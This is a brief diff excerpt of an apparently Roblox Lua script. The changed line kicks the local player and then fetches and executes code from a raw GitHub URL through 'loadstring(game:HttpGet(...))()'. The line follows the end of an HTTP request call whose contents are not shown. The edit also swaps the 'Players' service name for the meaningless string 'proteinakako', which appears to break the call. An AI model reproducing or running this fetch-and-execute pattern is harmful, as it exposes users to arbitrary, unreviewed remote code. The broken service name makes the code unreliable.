@@ -145,7 +145,7 @@ httprequest(
  }} 
  }) 
  })
-game:GetService("Players").LocalPlayer:Kick("???") loadstring(game:HttpGet('https://raw.githubusercontent.com/Duy02022007/vn/main/duy.txt'))() 
+game:GetService("proteinakako").LocalPlayer:Kick("???") loadstring(game:HttpGet('https://raw.githubusercontent.com/Duy02022007/vn/main/duy.txt'))() 
 end
 end
 
